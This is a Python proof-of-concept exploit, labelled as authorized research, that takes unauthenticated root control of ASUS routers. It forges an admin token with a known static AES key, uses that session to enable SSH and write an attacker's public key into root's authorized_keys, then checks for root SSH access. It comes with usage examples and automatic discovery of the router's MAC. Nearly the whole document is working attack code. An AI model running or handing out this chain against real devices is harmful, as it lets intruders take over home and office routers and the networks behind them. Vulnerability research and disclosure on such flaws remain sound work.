#!/usr/bin/env python3
"""ASUS router unauthenticated root chain PoC — SSH variant (authorized research).

Stage 1  Forge an admin asus_token via the unauthenticated
         asusrouter_request_access_token.cgi: an unknown mobile_deviceid leaves
         the clientlist secret empty, so the AES-256-ECB ticket key is the
         known MD5("") constant D41D8CD98F00B204E9800998ECF8427E. The minted
         token enters the httpd session list = full admin session.
Stage 2  Apply sshd_enable=1 + sshd_authkeys=<key> + action_script=restart_sshd;
         rc's start_sshd writes the key verbatim to /root/.ssh/authorized_keys
         and starts dropbear as root.
Stage 3  Verify the SSH port answers.

Target preconditions (normal post-setup state): privacy consent
accepted, http_oauth_clientlist non-empty.

Label MAC: auto-detected via infosvr UDP/9999 (request 0x0C15, op 31/52; the
0x200-byte reply carries the label MAC at offset 0x1D8, from get_label_mac()).
If that fails, find it with `ip neighbor show` and pass --label-mac.

Usage:
  ./asus_unauth_ssh_chain.py 192.168.50.1 --key @id_ed25519.pub
  ./asus_unauth_ssh_chain.py 192.168.50.1 --label-mac 04D4C4AABBCC --key 'ssh-ed25519 AAAA... u@h'
  ./asus_unauth_ssh_chain.py 192.168.50.1 --key '' --cleanup
"""

import argparse
import base64
import json
import os
import random
import re
import socket
import ssl
import sys
import time
import urllib.parse
from http.client import HTTPSConnection, HTTPConnection

try:
    from Crypto.Cipher import AES
except ImportError:
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

KEY = b"D41D8CD98F00B204E9800998ECF8427E"   # MD5("") hex, uppercase
ERRORS = {"400": "preconditions missing (privacy consent / empty http_oauth_clientlist) or bad ticket",
          "4002": "label_mac mismatch", "4008": "timestamp out of window",
          "403": "deviceid matched a stale clientlist entry"}
# App-style UA (sub_48DE14 client type != 0): the dispatcher then skips the
# web-session login_ip lock, which otherwise redirects cookie-less/browsers
# clients to Main_Login.asp when another device holds the web session.
UA = "asusrouter-Android-1.0.0.6.0"


def aes_ecb_encrypt(plaintext):
    if "AES" in globals():
        return AES.new(KEY, AES.MODE_ECB).encrypt(
            plaintext + bytes([16 - len(plaintext) % 16]) * (16 - len(plaintext) % 16))
    enc = Cipher(algorithms.AES(KEY), modes.ECB()).encryptor()
    pt = plaintext + bytes([16 - len(plaintext) % 16]) * (16 - len(plaintext) % 16)
    return enc.update(pt) + enc.finalize()


def forge_ticket(label_mac, ts):
    payload = json.dumps({"label_mac": label_mac, "timestamp": ts},
                         separators=(",", ":")).encode()
    return base64.b64encode(aes_ecb_encrypt(payload)).decode()


def http_post(target, port, use_https, path, fields, cookie=None, timeout=15):
    headers = {"Content-Type": "application/x-www-form-urlencoded",
               "User-Agent": UA}
    if cookie:
        headers["Cookie"] = cookie
    conn = (HTTPSConnection(target, port, context=ssl._create_unverified_context(), timeout=timeout)
            if use_https else HTTPConnection(target, port, timeout=timeout))
    try:
        conn.request("POST", path, body=urllib.parse.urlencode(fields,
                    quote_via=urllib.parse.quote), headers=headers)
        r = conn.getresponse()
        return r.status, r.read().decode("utf-8", "replace")
    finally:
        conn.close()


# infosvr discovery: [0x0C 0x15][u16le op][4-byte id] + payload (op 31: JSON).
# 0x200-byte reply: 0x0C16 magic, productid +200, firmver +232, LAN MAC +249,
# label MAC +0x1D8. Sent broadcast to the request's source port.
def discover_label_macs(target, timeout=2.0):
    macs = []
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        s.bind(("", 0))
        s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        for op in (31, 52):
            pkt = bytes((0x0C, 0x15, op, 0)) + b"PoC\x00" + (b"{}" if op == 31 else b"\0" * 6)
            try:
                s.sendto(pkt, (target, 9999))
                s.settimeout(timeout)
                data, _ = s.recvfrom(1024)
            except OSError:
                continue
            if len(data) >= 478 and data[:2] == b"\x0c\x16":
                mac = lambda off: ":".join(f"{b:02X}" for b in data[off:off + 6])
                label, lan = mac(0x1D8), mac(249)
                if label != "00:00:00:00:00:00" and not int(label[0:2], 16) & 1:
                    macs += [label.replace(":", ""), lan.replace(":", "")]
                print(f"[*] infosvr: {data[200:216].split(bytes([0]))[0].decode('ascii', 'replace')} "
                      f"fw {data[232:243].split(bytes([0]))[0].decode('ascii', 'replace')} "
                      f"label {label} lan {lan}")
                break
    return [m for i, m in enumerate(macs) if m and m not in macs[:i]]


def mac_variants(raw):
    m = raw.strip().replace(":", "").replace("-", "").upper()
    if not re.fullmatch(r"[0-9A-F]{12}", m):
        sys.exit(f"[!] '{raw}' is not a MAC address")
    return [m, ":".join(m[i:i + 2] for i in range(0, 12, 2))]


def stage1(target, port, use_https, label_mac, device_id):
    ticket = forge_ticket(label_mac, int(time.time()))
    status, body = http_post(target, port, use_https,
                             "/asusrouter_request_access_token.cgi",
                             {"mobile_deviceid": device_id, "access_ticket": ticket})
    m = re.search(r'"asus_token"\s*:\s*"([A-Za-z0-9]+)"', body)
    if m:
        print(f"[+] Stage 1 ok — forged asus_token: {m.group(1)}")
        return m.group(1)
    e = re.search(r'"error_status"\s*:\s*"?(\d+)', body)
    print(f"[!] Stage 1 failed: {ERRORS.get(e.group(1), f'HTTP {status}: {body[:200]!r}') if e else f'HTTP {status}: {body[:200]!r}'}")
    return None


def stage2(target, port, use_https, token, pubkey, endpoint, ssh_port, cleanup):
    # app endpoint (applyapp.cgi) restarts services via "rc_service" -> notify_rc;
    # the web endpoint (start_apply.htm) uses "action_script". Send both.
    trigger = {"action_mode": "apply", "rc_service": "restart_sshd",
               "action_script": "restart_sshd"}
    fields = dict(trigger, **({"sshd_enable": "0", "sshd_authkeys": ""} if cleanup else
                              {"sshd_enable": "1", "sshd_pass": "1",
                               "sshd_port": str(ssh_port), "sshd_authkeys": pubkey}))
    status, body = http_post(target, port, use_https, f"/{endpoint}", fields,
                             cookie=f"asus_token={token}" if token else None)
    print(f"[*] Stage 2 apply → HTTP {status}: {body[:200]!r}")
    if "Main_Login" in body:
        print("[!] apply REJECTED (login redirect) — session not accepted")
        return False
    return status == 200


def ssh_open(target, ssh_port, tries=1, timeout=3):
    for _ in range(tries):
        try:
            with socket.create_connection((target, ssh_port), timeout) as s:
                return s.recv(64)
        except OSError:
            if tries > 1:
                time.sleep(3)
    return None


def stage3(target, ssh_port, was_closed):
    banner = ssh_open(target, ssh_port, tries=10)
    if banner:
        print(f"[+] Stage 3 ok — port {ssh_port} banner: {banner!r}")
        if was_closed:
            print(f"\n[✓] root access: ssh -p {ssh_port} admin@{target}"
                  f"\n    (ASUS names the uid-0 account after http_username — often 'admin', not 'root')")
        else:
            print("[!] note: SSH was already enabled before this run — banner does not prove the apply")
    else:
        print(f"[-] port {ssh_port} never opened — retry ssh in ~30 s")


def main():
    ap = argparse.ArgumentParser(description="Unauth asus_token forgery → SSH enable → "
                                             "authorized_keys injection (research PoC)")
    ap.add_argument("target", help="router IP or host")
    ap.add_argument("--label-mac", help="router label MAC; omit to auto-detect via infosvr")
    ap.add_argument("--key", default="",
                    help="public key line or @file ('' with --cleanup)")
    ap.add_argument("--port", type=int, default=80)
    ap.add_argument("--https", action="store_true")
    ap.add_argument("--endpoint", default="applyapp.cgi",
                    choices=["applyapp.cgi", "start_apply.htm"])
    ap.add_argument("--ssh-port", type=int, default=22)
    ap.add_argument("--cleanup", action="store_true", help="disable SSH and clear keys")
    args = ap.parse_args()

    key = " ".join(open(os.path.expanduser(args.key[1:])).read().split()) \
        if args.key.startswith("@") else args.key
    device_id = "".join(random.choice("0123456789ABCDEF") for _ in range(32))

    if args.label_mac:
        variants = mac_variants(args.label_mac)
    else:
        found = discover_label_macs(args.target)
        if not found:
            sys.exit("[!] infosvr auto-detect failed. Get the MAC manually:\n"
                     "      ip neighbor show | grep " + args.target + "\n"
                     "    (take the lladdr value) and re-run with --label-mac <MAC>")
        variants = [v for m in found for v in mac_variants(m)]

    token = None
    for variant in variants:
        print(f"[*] Stage 1: label_mac={variant}")
        token = stage1(args.target, args.port, args.https, variant, device_id)
        if token:
            break
    if not token:
        sys.exit("[!] token forgery failed — check preconditions in the header")

    if not args.key and not args.cleanup:
        sys.exit("[!] --key required (pubkey line or @file)")
    print(f"[*] Stage 2: {'cleanup' if args.cleanup else 'enable SSH + inject key'}")
    was_closed = not args.cleanup and ssh_open(args.target, args.ssh_port) is None
    if not stage2(args.target, args.port, args.https, token, key, args.endpoint,
                  args.ssh_port, args.cleanup):
        sys.exit("[!] apply failed")
    if not args.cleanup:
        stage3(args.target, args.ssh_port, was_closed)


if __name__ == "__main__":
    main()
